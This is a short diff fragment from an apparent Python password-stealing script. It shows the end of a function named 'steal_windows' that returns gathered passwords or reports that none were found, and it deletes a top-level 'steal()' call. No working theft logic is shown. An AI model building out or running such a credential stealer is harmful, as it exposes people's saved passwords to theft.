@@ -116,5 +116,3 @@ def steal_windows():
 		return ret
 	else:
 		return ('[-] There are no passwords')
-
-steal()
